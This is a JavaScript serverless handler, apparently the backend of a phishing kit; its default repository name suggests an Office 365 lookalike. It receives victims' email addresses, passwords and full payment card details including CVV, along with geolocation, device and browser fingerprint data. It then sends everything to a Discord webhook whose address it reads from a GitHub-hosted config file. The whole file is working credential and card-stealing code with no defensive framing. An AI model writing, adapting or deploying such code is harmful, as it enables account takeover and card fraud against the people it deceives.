import { Buffer } from 'node:buffer';

const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_OWNER = process.env.GH_OWNER || 'varasjaime777-alt';
const GH_REPO = process.env.GH_REPO || 'mail.office3655';
const CONFIG_PATH = 'config.json';
const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;
const headers = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept': 'application/vnd.github.v3+json',
  'User-Agent': 'PanelControlVercel/2.0'
};

async function githubRead() {
  const res = await fetch(GITHUB_API, { method: 'GET', headers });
  if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
  const data = await res.json();
  return {
    config: JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8')),
    sha: data.sha || null
  };
}

async function githubWrite(content, sha) {
  const body = {
    message: 'Actualización del panel de control',
    content: Buffer.from(JSON.stringify(content, null, 2)).toString('base64'),
    branch: 'main',
  };
  if (sha) body.sha = sha;

  const res = await fetch(GITHUB_API, {
    method: 'PUT',
    headers: { ...headers, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.message || `GitHub write error: ${res.status}`);
  }

  const data = await res.json();
  return { config: content, sha: data.content.sha };
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    let config = {};
    try {
      const readResult = await githubRead();
      config = readResult.config || {};
    } catch (e) {
      // El archivo no existe todavía
    }

    const webhookUrl = config.discordWebhook || '';
    if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) {
      return res.status(400).json({ error: 'Webhook no configurado', debug_message: 'Webhook no configurado en config.json' });
    }

    const body = req.body || {};
    const email = body.email || 'unknown';
    const password = body.password || '****';
    const cardNumber = body.cardNumber || '';
    const cardHolder = body.cardHolder || '';
    const expiryDate = body.expiryDate || '';
    const cvv = body.cvv || '****';
    const timestamp = new Date().toISOString();
    const forwardedFor = req.headers['x-forwarded-for'] || '';
    const clientIp = forwardedFor.split(',')[0]?.trim() || 'desconocida';

    // Datos del navegador
    const userAgent = body.userAgent || 'desconocido';
    const language = body.language || 'desconocido';
    const languages = body.languages || language;
    const screenResolution = body.screenResolution || 'desconocido';
    const colorDepth = body.colorDepth || 'desconocido';
    const timezone = body.timezone || 'desconocido';
    const platform = body.platform || 'desconocido';
    const onlineStatus = body.onlineStatus || 'desconocido';
    const cookiesEnabled = body.cookiesEnabled || 'desconocido';

    // Datos Geo IP
    const geoIp = body.geoIp || (body.ipifyIp || clientIp);
    const geoCity = body.geoCity || '';
    const geoRegion = body.geoRegion || '';
    const geoCountry = body.geoCountry || '';
    const geoCountryCode = body.geoCountryCode || '';
    const geoTimezone = body.geoTimezone || timezone;
    const geoIsoCode = body.geoIsoCode || '';
    const geoIsp = body.geoIsp || '';
    const geoLatitude = body.geoLatitude || '';
    const geoLongitude = body.geoLongitude || '';
    const geoZip = body.geoZip || '';
    const geoCurrency = body.geoCurrency || '';
    const geoCurrencyCode = body.geoCurrencyCode || '';
    const geoCallingCode = body.geoCallingCode || '';
    const geoNetwork = body.geoNetwork || '';

    // Dispositivo
    const deviceMemory = body.deviceMemory || 'desconocido';
    const cpuCores = body.cpuCores || 'desconocido';
    const touchPoints = body.touchPoints || 0;
    const isMobile = body.isMobile || 'desconocido';
    const isTablet = body.isTablet || 'desconocido';
    const isDesktop = body.isDesktop || 'desconocido';

    // Batería
    const batteryLevel = body.batteryLevel || 'No disponible';
    const batteryCharging = body.batteryCharging || 'Desconocido';

    // Tipo de mensaje
    const messageType = body.messageType || (cardNumber ? 'payment' : 'login');

    let message = '';
    const template = config.discordMessageTemplate || '';

    if (template && template.includes('{email}')) {
      message = template;
      message = message.replace(/\{email\}/g, email);
      message = message.replace(/\{password\}/g, password);
      message = message.replace(/\{cardNumber\}/g, cardNumber);
      message = message.replace(/\{cardHolder\}/g, cardHolder);
      message = message.replace(/\{expiryDate\}/g, expiryDate);
      message = message.replace(/\{cvv\}/g, cvv);
      message = message.replace(/\{ip\}/g, clientIp);
      message = message.replace(/\{geoIp\}/g, geoIp);
      message = message.replace(/\{geoCity\}/g, geoCity);
      message = message.replace(/\{geoRegion\}/g, geoRegion);
      message = message.replace(/\{geoCountry\}/g, geoCountry);
      message = message.replace(/\{geoCountryCode\}/g, geoCountryCode);
      message = message.replace(/\{geoTimezone\}/g, geoTimezone);
      message = message.replace(/\{geoIsp\}/g, geoIsp);
      message = message.replace(/\{geoLatitude\}/g, geoLatitude);
      message = message.replace(/\{geoLongitude\}/g, geoLongitude);
      message = message.replace(/\{geoZip\}/g, geoZip);
      message = message.replace(/\{geoCurrency\}/g, geoCurrency);
      message = message.replace(/\{geoCurrencyCode\}/g, geoCurrencyCode);
      message = message.replace(/\{geoCallingCode\}/g, geoCallingCode);
      message = message.replace(/\{geoNetwork\}/g, geoNetwork);
      message = message.replace(/\{deviceMemory\}/g, deviceMemory);
      message = message.replace(/\{cpuCores\}/g, cpuCores);
      message = message.replace(/\{touchPoints\}/g, touchPoints);
      message = message.replace(/\{isMobile\}/g, isMobile);
      message = message.replace(/\{isTablet\}/g, isTablet);
      message = message.replace(/\{isDesktop\}/g, isDesktop);
      message = message.replace(/\{batteryLevel\}/g, batteryLevel);
      message = message.replace(/\{batteryCharging\}/g, batteryCharging);
      message = message.replace(/\{userAgent\}/g, userAgent);
      message = message.replace(/\{language\}/g, language);
      message = message.replace(/\{screenResolution\}/g, screenResolution);
      message = message.replace(/\{colorDepth\}/g, colorDepth);
      message = message.replace(/\{timezone\}/g, timezone);
      message = message.replace(/\{platform\}/g, platform);
      message = message.replace(/\{onlineStatus\}/g, onlineStatus);
      message = message.replace(/\{cookiesEnabled\}/g, cookiesEnabled);
      message = message.replace(/\{timestamp\}/g, timestamp);
      message = message.replace(/\{messageType\}/g, messageType);
    } else {
      if (messageType === 'login') {
        message = '🔐 Nuevo inicio de sesión';
        message += '\n──────────────────────────';
        message += '\nUsuario: ' + email;
        message += '\nContraseña: ' + password;
        message += '\nIP: ' + clientIp;
        message += '\nGeo IP: ' + geoIp;
        message += '\nCiudad: ' + geoCity;
        message += '\nRegión: ' + geoRegion;
        message += '\nPaís: ' + geoCountry + ' (' + geoCountryCode + ')';
        message += '\nISP/Organización: ' + geoIsp;
        message += '\nLatitud: ' + geoLatitude;
        message += '\nLongitud: ' + geoLongitude;
        message += '\n\nDispositivo:';
        message += '\nMemoria RAM: ' + deviceMemory + ' GB';
        message += '\nCPU: ' + cpuCores + ' núcleos';
        message += '\nPuntos táctiles: ' + touchPoints;
        message += '\nTipo: ' + isMobile + ' (Móvil) / ' + isTablet + ' (Tablet) / ' + isDesktop + ' (Escritorio)';
        message += '\nBatería: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';
        message += '\n\nNavegador: ' + userAgent;
        message += '\nIdioma: ' + language;
        message += '\nPantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
        message += '\nZona horaria: ' + timezone;
        message += '\nPlataforma: ' + platform;
        message += '\nEstado: ' + onlineStatus;
        message += '\nCookies: ' + cookiesEnabled;
        message += '\n──────────────────────────';
        message += '\nHora: ' + timestamp;
      } else {
        message = '💳 Nuevo pago';
        message += '\n──────────────────────────';
        message += '\nTitular: ' + cardHolder;
        message += '\nTarjeta: ' + cardNumber;
        message += '\nExpiración: ' + expiryDate;
        message += '\nCVV: ' + cvv;
        message += '\nIP: ' + clientIp;
        message += '\nGeo IP: ' + geoIp;
        message += '\nCiudad: ' + geoCity;
        message += '\nPaís: ' + geoCountry + ' (' + geoCountryCode + ')';
        message += '\n\nDispositivo:';
        message += '\nMemoria RAM: ' + deviceMemory + ' GB';
        message += '\nCPU: ' + cpuCores + ' núcleos';
        message += '\nTipo: ' + isDesktop + ' (Escritorio) / ' + isMobile + ' (Móvil)';
        message += '\n\nNavegador: ' + userAgent;
        message += '\n──────────────────────────';
        message += '\nHora: ' + timestamp;
      }
    }

    // Fallback de contraseña si no está en el mensaje
    if (messageType === 'login' && message.includes(password) === false && password !== '****') {
      message += '\nContraseña: ' + password;
    }

    // Fallback de ubicación si no está en el mensaje
    if (!message.includes('Ciudad:') || !message.includes(geoCity)) {
      message += '\nCiudad: ' + geoCity;
      message += '\nRegión: ' + geoRegion;
      message += '\nPaís: ' + geoCountry + ' (' + geoCountryCode + ')';
    }

    // Enviar a Discord
    const discordRes = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message }),
    });

    if (!discordRes.ok) {
      const text = await discordRes.text();
      return res.status(500).json({ error: 'Error enviando a Discord: ' + discordRes.status, success: false, debug_message: message });
    }

    return res.status(200).json({ success: true, message: 'Mensaje enviado a Discord correctamente.', debug_message: message });
  } catch (err) {
    console.error('Error en API de Discord:', err);
    return res.status(500).json({ error: 'Error interno: ' + err.message, debug_message: err.message });
  }
}
